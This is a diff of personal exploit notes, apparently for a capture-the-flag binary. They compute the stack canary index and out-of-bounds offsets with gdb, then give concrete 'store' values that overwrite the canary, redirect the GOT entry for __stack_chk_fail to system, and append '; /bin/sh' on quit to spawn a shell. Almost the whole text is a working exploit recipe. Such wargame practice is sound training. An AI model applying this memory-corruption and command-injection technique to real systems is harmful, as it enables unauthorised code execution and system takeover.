@@ -1,14 +1,42 @@
+////////////// unset env LINES   /////////////////////
+////////////// unset env COLUMNS /////////////////////
  
+mem = buffer + 36 = 0xffffd504
 
- ////////////// unset env LINES /////////////////////
- ////////////// unset env COLUMNS /////////////////////
- 
+///////////////////////////////////////////////////////
 
- b *0x08048878
+index: 11005 -> 33016 >> 2 ( = 8254 )
 
-mem = buffer + 440 = 0xffffd6b8
+///////////////////////////////////////////////////////////////
 
+0xffffd6ac = address of canary
+0xffffd6ac - 0xffffd504 = 424 (424 >> 2 = 106) -> 106 = canary index
 
-gdb-peda$ p $ebp -> 0xffffd6e8
+///////////////////////////////////////////////////////////////
 
-ebp + 4 = 0xffffd6ec = mem + 52
+gdb-peda$ p/d 0x0804a010 (__stack_chk_fail) >> 2
+$39 =  0x2012804 ( = 33630212)
+
+gdb-peda$ p/d 11005 + 0x2012804 - 8254
+$43 = 33632963
+
+4159090384 : value of system
+
+33632963 : to get to 0804a010 (__stack_chk_fail)
+
+////////////////////////
+
+1st step: change canary so __stack_chk_fail is called before end of program
+store
+	1337
+	106
+2nd step: change GOT of __stack_chk_fail to system with overflow 
+store
+	4159090384
+	33632963
+3rd step : quit program while using the 20 bytes of string to add "; /bin/sh"
+so it is evaluated by system and spawns a shell
+
+quit ; /bin/sh
+
+-> shell spawns !
